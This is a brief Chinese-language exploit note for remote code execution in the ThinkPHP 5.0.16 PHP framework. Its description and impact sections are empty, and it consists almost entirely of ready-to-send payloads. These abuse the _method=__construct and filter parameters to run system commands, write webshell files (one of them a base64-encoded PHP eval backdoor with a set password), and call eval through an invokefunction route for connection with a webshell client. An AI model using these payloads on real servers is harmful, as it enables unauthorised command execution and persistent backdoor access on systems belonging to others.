Thinkphp 5.0.16
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

> https://www.0-sec.org/?s=index/index

    post

    s=whoami&_method=__construct&method=POST&filter[]=system
    aaaa=whoami&_method=__construct&method=GET&filter[]=system
    _method=__construct&method=GET&filter[]=system&get[]=whoami
    c=system&f=calc&_method=filter

> 写shell

    POST

    s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert

> 有captcha路由时无需debug=true
>
> https://www.0-sec.org/?s=captcha/calc

    POST 

    _method=__construct&filter[]=system&method=GET

> 写shell

    post

    s=file_put_contents('/绝对路径/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert    

    密码aaaa

> 直接菜刀连

    http://wwww.0-sec.org/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1])
